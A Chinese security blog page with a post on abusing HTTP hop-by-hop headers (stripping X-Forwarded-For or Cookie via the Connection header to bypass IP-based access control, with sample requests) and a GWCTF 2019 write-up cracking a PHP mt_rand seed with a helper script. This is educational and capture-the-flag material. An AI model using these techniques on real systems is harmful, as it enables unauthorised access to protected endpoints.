  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/07/15/hop-by-hop%E7%9B%B8%E5%85%B3%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86%E7%82%B9/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="sing">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="sing's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/07/15/hop-by-hop%E7%9B%B8%E5%85%B3%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86%E7%82%B9/" class="post-title-link" itemprop="url">hop-by-hop相关安全知识点</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-07-15 22:57:09" itemprop="dateCreated datePublished" datetime="2022-07-15T22:57:09+08:00">2022-07-15</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-11-20 18:43:06" itemprop="dateModified" datetime="2022-11-20T18:43:06+08:00">2022-11-20</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/hop-by-hop/" itemprop="url" rel="index"><span itemprop="name">hop-by-hop</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="hop-by-hop-标头相关知识"><a href="#hop-by-hop-标头相关知识" class="headerlink" title="hop-by-hop 标头相关知识"></a>hop-by-hop 标头相关知识</h1><h2 id="乜叉係-hop-by-hop？"><a href="#乜叉係-hop-by-hop？" class="headerlink" title="乜叉係 hop-by-hop？"></a>乜叉係 hop-by-hop？</h2><p>先解释下这是什么东西。根据 <a target="_blank" rel="noopener" href="https://datatracker.ietf.org/doc/html/rfc2616#section-13.5.1">RFC 2612</a>，HTTP&#x2F;1.1 规范默认将以下标头视为 hop-by-hop ：<code>Keep-Alive</code>、<code>Transfer-Encoding</code>、<code>TE</code>、<code>Connection</code>、<code>Trailer</code>、<code>Upgrade</code>、<code>Proxy-Authorization</code> 和 <code>Proxy-Authenticate</code>。当在请求中遇到这些标头时，代理服务器会处理这些标头，并且不会将其转发到下一个节点。<br>除了这些默认值之外，用户还可以自定义逐跳标头，<a target="_blank" rel="noopener" href="https://datatracker.ietf.org/doc/html/rfc2616#section-14.10">只需要将标头的 key 添加到 <code>Connection</code> 标头的 value 中，即可被视为逐跳标头</a>，如下所示：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Connection：close, X-Foo, X-Bar</span><br></pre></td></tr></table></figure>
<p>上面代码表示，我们要求代理服务器将 <code>X-Foo</code> 和 <code>X-Bar</code> 视为 hop-by-hop，这表明我们希望代理在转发请求到下一跳之前将 <code>X-Foo</code> 和 <code>X-Bar</code> 进行处理并删除。</p>
<h2 id="关于滥用-hop-by-hop-header-的一些理论"><a href="#关于滥用-hop-by-hop-header-的一些理论" class="headerlink" title="关于滥用 hop-by-hop header 的一些理论"></a>关于滥用 hop-by-hop header 的一些理论</h2><p>直接删除某些 <code>header</code> ，不一定会导致问题，但要是能够删除原始请求中不存在的，由前端或 HTTP 请求流程链中的另一个代理添加的 <code>header</code> 可能会造成不可预测的结果。<br>例如，在一条 HTTP 请求链中，某个代理服务器可能会在请求包中插入了一个 <code>hearder</code> ，该 <code>header</code> 可能涉及到后端访问控制策略或者描述 <code>internet</code> 用户的真实地址，缺失该 <code>hearder</code> 会导致应用程序处理逻辑出错，从而输出大量的调试错误信息。当某个前端代理存在转发 <code>hop-by-hop header</code> 列表行为，而不是按到规定处理 <code>hop-by-hop header</code> 的时候就可能会产生问题，因为它添加到请求中的任何 <code>header</code> 都可能被 <code>next hop</code> 删除。<br>上面知识已经提及到，<code>Connection</code> 头本身是一个 <code>hop-by-hop</code> 头。这就意味着一个合符规范的代理服务器在转发请求时，应按照 <code>Connection</code> 头中的自定义<code>hop-by-hop</code> 头列表，删除相应的请求头，而不应将请求包中的自定义<code>hop-by-hop</code> 头列表通过 <code>Connection</code> 头转发给下一个服务器中。然而，研究表明，这可能并不总是像预期的那样发生，一些系统似乎也转发整个 <code>Connection</code> 头，或者复制 <code>hop-by-hop</code> 列表并将其附加到自己的 <code>Connection</code> 头中。</p>
<p>下面的图表显示了 <code>hop-by-hop</code> 标头可能会造成的问题，如果后端期望 <code>X-Important-Header</code> 并将其纳入到逻辑决策中<br><img src="https://nathandavison.com/user/pages/01.blog/abusing-http-hop-by-hop-request-headers/hbh-theory-diagram.PNG" alt="img1"></p>
<p>下面介绍遇到的滥用逐跳报头的例子，以及在哪里可以发现影响的一些想法，但潜在的结果将非常具体的应用程序和基础设施的目标，以及报头的目标和它们对后端意味着什么。</p>
<h2 id="如何发现系统中是否存在-hop-by-hop-header"><a href="#如何发现系统中是否存在-hop-by-hop-header" class="headerlink" title="如何发现系统中是否存在 hop-by-hop header"></a>如何发现系统中是否存在 hop-by-hop header</h2><p>~~ 我们可以很容易测试一个系统是否受到某种逐跳头部攻击影响。一个请求头出现和不出现时，会在响应中产生明显的差异，例如 Cookie。我们可以将一个这样的请求头，作为 <code>hop-by-hop</code> 头添加到 <code>Connection</code> 头中。如果请求链中的某个代理行为符合规范，会删除 <code>hop-by-hop</code> 头，那么当该请求头同时出现在请求中以及 <code>Connection</code> 消息头中列出时，响应应该与它根本不出现在请求中相同，但与它出现在请求中且不作为逐跳消息头列出时不同。~~</p>
<p>众所周知，Cookie 作为认证手段，携带 Cookie 访问与不携带 Cookie 访问某个业务接口，服务器响应内容可能具有明显差异。假设用户经过认证后的 Cookie 为 <code>Cookie: session=admin</code>，访问 <code>api/me</code> 服务器返回 <code>HTTP 200</code> 。未经认证访问 <code>api/me</code> ，则返回 <code>HTTP 302</code>。通过 Cookie 测试系统中是否存在 hop-by-hop 流程如下：</p>
<ul>
<li><p>认证后访问，返回 <code>HTTP 200</code></p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/api/me</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>foo.bar</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>session=admin</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br></pre></td></tr></table></figure>
</li>
<li><p>未认证访问，返回 <code>HTTP 302</code></p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/api/me</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>foo.bar</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br></pre></td></tr></table></figure>
</li>
<li><p>系统中存在合规的代理，代理按照规范删除 Cookie 请求头，相当于未认证访问，返回 <code>HTTP 302</code></p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/api/me</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>foo.bar</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>session=admin</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close, Cookie</span><br></pre></td></tr></table></figure></li>
</ul>
<p>通常，我们是用自动化工具进行测试，例如 burpsuite 的 intruder 功能进行测试，传入一些<a target="_blank" rel="noopener" href="https://github.com/danielmiessler/SecLists/tree/master/Discovery/Web-Content/BurpSuite-ParamMiner"><strong>请求头字典</strong></a>进行测试。</p>
<h2 id="通过隐藏-X-Forwarded-For-来屏蔽原始-IP-地址"><a href="#通过隐藏-X-Forwarded-For-来屏蔽原始-IP-地址" class="headerlink" title="通过隐藏 X-Forwarded-For 来屏蔽原始 IP 地址"></a>通过隐藏 X-Forwarded-For 来屏蔽原始 IP 地址</h2><p>假设一个场景：前端代理接收用户请求，会将用户真实 IP 地址添加到 <code>X-Forwarded-For</code>(XFF) 请求头中，后端的基础设施和应用程序基于 XFF 头可以知道请求用户的真实 IP 地址。但如果系统中一个的代理符合规范，我们将会将 <code>X-Forwarded-For</code> 作为自定义 hop-by-hop 头的时候（Just like that：<code>Connection: close, X-Forwarded-For</code>），那么后端将不会接收到用户真实IP地址（<em>可能是接收不到 XFF 头,或者接收到了 XFF 头，但XFF 值为前端代理的 IP 地址,例如：CloudFoundry 中的 gorouter,在 CloudFoundry中的 gorouter 将请求转发到后端应用程序之前，如果请求中尚不存在 XFF 头 ，则会将其之前设备的 IP 地址设置为 XFF头值</em>）。所以，通过上面的方式我们就可以隐藏 XFF 头。<br>说了这么多，仅仅是隐藏真实 IP 地址，好似冇乜撚用，不过如果系统中存在以下情况的话，就可能触发另一种漏洞 – 影响后端关于访问控制策略的判断，从而造成非法访问。场景如下：</p>
<ol>
<li>应用系统组成如下：<em><strong>代理A(IP:10.1.10.1)</strong></em> –&gt; <em><strong>代理B(IP:10.1.10.2)</strong></em> –&gt; <em><strong>后端应用系统C(IP:10.1.10.3)</strong></em> 。</li>
<li>关于 <em><strong>后端应用系统C(IP:10.1.10.3)</strong></em> 的 <code>/admin</code> 拥有了如下的访问控制逻辑，当遇到访问 IP 为 <code>10.1.10.0/24</code> 的时候，直接 Bypass。</li>
<li><em><strong>代理A(IP:10.1.10.1)</strong></em> 会自动添加 XFF 头，用以描述用户真实IP，即使尝试传统的 <code>X-Forwarded-For</code> 欺骗，<em><strong>代理A(IP:10.1.10.1)</strong></em> 仍然会将真实的原始 IP 附加到标头，这样看起来像 <code>X-Forwarded-For: &lt;attacker spoofed ip&gt;, &lt;real attacker ip&gt;</code>，因此该应用程序可以安全地处理欺骗尝试。同时 <em><strong>代理A</strong></em> 只会完全转发 hop-by-hop 头列表，而不对其进行任何处理。</li>
<li>符合规范的 <em><strong>代理B(IP:10.1.10.2)</strong></em> 接收到 <em><strong>代理A(IP:10.1.10.1)</strong></em> 的请求包后，对 hop-by-hop 头列表进行处理。</li>
<li><em><strong>后端应用系统C(IP:10.1.10.3)</strong></em> 接收到 <em><strong>代理B</strong></em> 转发的请求包，发现没有 XFF 头后，自动为请求包添加 XFF 头，XFF 值为 <em><strong>代理B</strong></em> 的 IP地址。</li>
</ol>
<p>所以，问题显而易见，当攻击者发送一个如下的 hop-by-hop 头：<code>Connection: close, X-Forwarded-For</code> 的时候。<em><strong>代理B</strong></em> 将删除请求头中的 <code>X-Forwarded-For</code> 头，结合上述第五点，攻击者即可直接访问 <code>/admin</code> 。类似的案例有：<a target="_blank" rel="noopener" href="https://github.com/ritsec/RITSEC-CTF-2019/tree/master/Web/hop-by-hop">RITSEC-CTF-2019-hop-by-hop</a> </p>
<p><img src="https://images.seebug.org/content/images/2022/05/26/1653550381000-20kgbov.png-w331s" alt="img"></p>
<p>在verify函数中尝试获取 XFF 头，如果获取不到则默认为 direct。而前置服务为 apache，根据逐跳原则，当Connection 中加了其他标头 X-Forwarded-For，那么在 apache 转发给下一跳时，会移除 X-Forwarded-For 头，导致在 verify 函数中 request.headers[‘X-Forwarded-For’] 抛出异常，由此拿到 flag。</p>
<h2 id="指纹服务"><a href="#指纹服务" class="headerlink" title="指纹服务"></a>指纹服务</h2><p>使用该技术删除一些请求头，可能会触发错误报告，根据特定的报告信息，可作为指纹识别使用。</p>
<h2 id="关于-Abusing-HTTP-hop-by-hop-request-headers-一文中-SSRF-的说明"><a href="#关于-Abusing-HTTP-hop-by-hop-request-headers-一文中-SSRF-的说明" class="headerlink" title="关于 Abusing HTTP hop-by-hop request headers 一文中 SSRF 的说明"></a>关于 <a target="_blank" rel="noopener" href="https://nathandavison.com/blog/abusing-http-hop-by-hop-request-headers">Abusing HTTP hop-by-hop request headers</a> 一文中 SSRF 的说明</h2><p>文中所述，该开始的时候有点难以理解，后经多次阅读后发现作者意思如下：SSRF 漏洞 ，中文为跨站伪造访问漏洞，攻击者通过该漏洞可以指引服务器发起请求，包括 HTTP 、FTP 等请求。假如可以在执行 SSFR 时候，攻击者还可以控制服务器发起请求时的请求头，那么或许可以结合 hop-by-hop 攻击进行组合利用。</p>
<h2 id="关于-hop-by-hop-的漏洞"><a href="#关于-hop-by-hop-的漏洞" class="headerlink" title="关于 hop-by-hop 的漏洞"></a>关于 hop-by-hop 的漏洞</h2><p>CVE-2022-1388 </p>
<h2 id="hop-by-hop的适用面"><a href="#hop-by-hop的适用面" class="headerlink" title="hop by hop的适用面"></a>hop by hop的适用面</h2><p>根据其他师傅的测试，apache、nginx、openresty、HAProxy，其中只有apache会消费掉Connection中的请求头，其他的要单独测试了。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://paper.seebug.org/1908/#hop-by-hop_1\">https://paper.seebug.org/1908/#hop-by-hop_1\</a><br><a target="_blank" rel="noopener" href="https://nathandavison.com/blog/abusing-http-hop-by-hop-request-headers">https://nathandavison.com/blog/abusing-http-hop-by-hop-request-headers</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/05/04/GWCTF-2019-WriteUP-%E5%8F%8A-PHP-mt-rand-%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="sing">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="sing's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/05/04/GWCTF-2019-WriteUP-%E5%8F%8A-PHP-mt-rand-%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/" class="post-title-link" itemprop="url">GWCTF 2019 WriteUP 及 PHP mt_rand 安全问题</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-05-04 12:02:18 / Modified: 12:03:28" itemprop="dateCreated datePublished" datetime="2022-05-04T12:02:18+08:00">2022-05-04</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="GWCTF-2019-WriteUP-及-PHP-mt-rand-安全问题"><a href="#GWCTF-2019-WriteUP-及-PHP-mt-rand-安全问题" class="headerlink" title="GWCTF 2019 WriteUP 及 PHP mt_rand 安全问题"></a>GWCTF 2019 WriteUP 及 PHP mt_rand 安全问题</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近看到一道题 – GWCTF 2019，其中涉及 PHP mt_rand 函数安全问题以及相关攻击工具 php_mt_seed4.0 的使用，遂有本文记录。</p>
<h2 id="PHP-mt-rand-函数简介"><a href="#PHP-mt-rand-函数简介" class="headerlink" title="PHP mt_rand 函数简介"></a>PHP mt_rand 函数简介</h2><p>PHP的mt_rand函数作为一个随机数生成工具在程序中被广泛使用，该函数用了 Mersenne Twister 算法的特性作为随机数发生器，它产生随机数值的平均速度比 libc 提供的 rand() 快四倍。mt_rand函数有两个可选参数 min 和 max，如果没有提供可选参数，mt_rand函数将返回返回 0 到 mt_getrandmax() 之间的伪随机数。例如想要 5 到 15（包括 5 和 15）之间的随机数，用 mt_rand(5, 15)。</p>
<p>常用的使用方式如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>() . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>() . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>(<span class="number">5</span>, <span class="number">15</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>以上程序的输出结果如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1604716014</span><br><span class="line">1478613278</span><br><span class="line">6</span><br></pre></td></tr></table></figure>

<h2 id="伪随机数"><a href="#伪随机数" class="headerlink" title="伪随机数"></a>伪随机数</h2><p>伪随机数是用确定性的算法计算出来的随机数序列，它并不真正的随机，但具有类似于随机数的统计特征，如均匀性、独立性等。在计算伪随机数时，若使用的初值（种子）不变，那么伪随机数的数序也不变。伪随机数可以用计算机大量生成，在模拟研究中为了提高模拟效率，一般采用伪随机数代替真正的随机数。模拟中使用的一般是循环周期极长并能通过随机数检验的伪随机数，以保证计算结果的随机性。伪随机数的生成方法有线性同余法、单向散列函数法、密码法等。</p>
<h2 id="PHP-mt-rand-引起的安全问题"><a href="#PHP-mt-rand-引起的安全问题" class="headerlink" title="PHP mt_rand 引起的安全问题"></a>PHP mt_rand 引起的安全问题</h2><p>mt_rand就是一个伪随机数生成函数，它由可确定的函数，通过一个种子产生的伪随机数。这意味着：如果知道了种子，或者已经产生的随机数，都可能获得接下来随机数序列的信息（可预测性）。<br>每次调用 mt_rand() 都会先检查是否已经播种。如果已经播种就直接产生随机数，否则调用 php_mt_srand 来播种。也就是说每个 php cgi 进程期间，只有第一次调用 mt_rand() 会自动播种。接下来都会根据这个第一次播种的种子来生成随机数。</p>
<h2 id="php-mt-seed-简介及使用说明"><a href="#php-mt-seed-简介及使用说明" class="headerlink" title="php_mt_seed 简介及使用说明"></a>php_mt_seed 简介及使用说明</h2><p>php_mt_seed 是一个破解 mt_rand 函数 seed 的工具，在最简单的调用模式下，它能通过 mt_rand 第一次输出的值寻找 mt_rand 的 seed，在更高级的模式中它能匹配不是第一次输出的和不明确具体输出的情况。</p>
<p>mt_rand 的算法从 PHP 3.0.6 开始就一直在变化，php_mt_seed 4.0 支持以下几个大的版本： PHP 3.0.7 to 5.2.0，PHP 5.2.1 to 7.0.x， and PHP 7.1.0+</p>
<p>php_mt_seed 基于命令行运行，命令行可以使用 1，2，4 或者更多的参数。这些参数需要详细说明 mt_rand() 的输出。</p>
<p><strong>一个参数</strong><br>当只有一个参数的时候，这个参数代表 mt_rand 第一次输出的值。</p>
<p><strong>两个参数</strong><br>当有两个参数的时候，他们代表 mt_rand 第一次输出应该位于什么区间内。<br>第一个参数为最小值，第二个参数为最大值。</p>
<p><strong>四个参数（高级模式）</strong><br>前两个参数表示 mt_rand 第一次输出的区间，后两个参数表示 mt_rand输出的区间。</p>
<p><strong>多于五个参数（高级模式）</strong><br>每四个参数一组，但是最后一组可以是1，2或4个参数。每一组引用对应的输出。</p>
<h2 id="GWCTF-2019"><a href="#GWCTF-2019" class="headerlink" title="GWCTF 2019"></a>GWCTF 2019</h2><ul>
<li><strong>check.php</strong><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#这不是抽奖程序的源代码！不许看！</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;seed&#x27;</span>]))&#123;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;seed&#x27;</span>]=<span class="title function_ invoke__">rand</span>(<span class="number">0</span>,<span class="number">999999999</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;seed&#x27;</span>]);</span><br><span class="line"><span class="variable">$str_long1</span> = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;</span><br><span class="line"><span class="variable">$str</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$len1</span>=<span class="number">20</span>;</span><br><span class="line"><span class="keyword">for</span> ( <span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$len1</span>; <span class="variable">$i</span>++ )&#123;</span><br><span class="line">    <span class="variable">$str</span>.=<span class="title function_ invoke__">substr</span>(<span class="variable">$str_long1</span>, <span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>, <span class="title function_ invoke__">strlen</span>(<span class="variable">$str_long1</span>) - <span class="number">1</span>), <span class="number">1</span>);       </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$str_show</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$str</span>, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;p id=&#x27;p1&#x27;&gt;&quot;</span>.<span class="variable">$str_show</span>.<span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;num&#x27;</span>]===<span class="variable">$str</span>)&#123;x</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p id=flag&gt;抽奖，就是那么枯燥且无味，给你flag&#123;xxxxxxxxx&#125;&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p id=flag&gt;没抽中哦，再试试吧&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="string">&quot;check.php&quot;</span>);</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="使用php-mt-seed4-0工具爆破seed"><a href="#使用php-mt-seed4-0工具爆破seed" class="headerlink" title="使用php_mt_seed4.0工具爆破seed"></a>使用php_mt_seed4.0工具爆破seed</h3><h4 id="生成-php-mt-seed4-0-所需要的参数"><a href="#生成-php-mt-seed4-0-所需要的参数" class="headerlink" title="生成 php_mt_seed4.0 所需要的参数"></a>生成 php_mt_seed4.0 所需要的参数</h4><p>check.php 中 <code>$str</code> 由 <code>substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1)</code> 执行 20 次，将 20 次的结果相加所得。根据题意第一次生成字符为c，即 <code>mt_rand(0, strlen($str_long1) - 1)</code> &#x3D; <code>2</code>。通过以下程序，找出每次执行 <code>mt_rand(0, strlen($str_long1) - 1)</code> 生成的结果。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line">s = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span></span><br><span class="line">key = <span class="string">&#x27;c1z5DuPZXT&#x27;</span></span><br><span class="line">m = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> key:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">        <span class="keyword">if</span> i == s[j]:</span><br><span class="line">            m += <span class="string">&quot;&#123;&#125; &#123;&#125; 0 &#123;&#125; &quot;</span>.<span class="built_in">format</span>(j,j,<span class="built_in">len</span>(s)-<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="comment">#2 2 0 61 27 27 0 61 25 25 0 61 31 31 0 61 39 39 0 61 20 20 0 61 51 51 0 61 61 61 0 61 59 59 0 61 55 55 0 61 </span></span><br></pre></td></tr></table></figure>

<h4 id="生成题目要求的字符串"><a href="#生成题目要求的字符串" class="headerlink" title="生成题目要求的字符串"></a>生成题目要求的字符串</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#version:php7.3.4</span></span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="number">744449933</span>);</span><br><span class="line"><span class="variable">$str_long1</span> = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;</span><br><span class="line"><span class="variable">$str</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$len1</span>=<span class="number">20</span>;</span><br><span class="line"><span class="keyword">for</span> ( <span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$len1</span>; <span class="variable">$i</span>++ )&#123;</span><br><span class="line">    <span class="variable">$str</span>.=<span class="title function_ invoke__">substr</span>(<span class="variable">$str_long1</span>, <span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>, <span class="title function_ invoke__">strlen</span>(<span class="variable">$str_long1</span>) - <span class="number">1</span>), <span class="number">1</span>);       </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line"><span class="comment">#c1z5DuPZXTSDNU66xXTU</span></span><br></pre></td></tr></table></figure>
<p>将该字符串提交即可得到flag</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41628669/article/details/106133105">https://blog.csdn.net/qq_41628669/article/details/106133105</a><br><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/192012.html">https://www.freebuf.com/vuls/192012.html</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/05/04/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="sing">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="sing's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/05/04/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox/" class="post-title-link" itemprop="url">CISCN2019 华北赛区 Day1  Web1 Dropbox</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

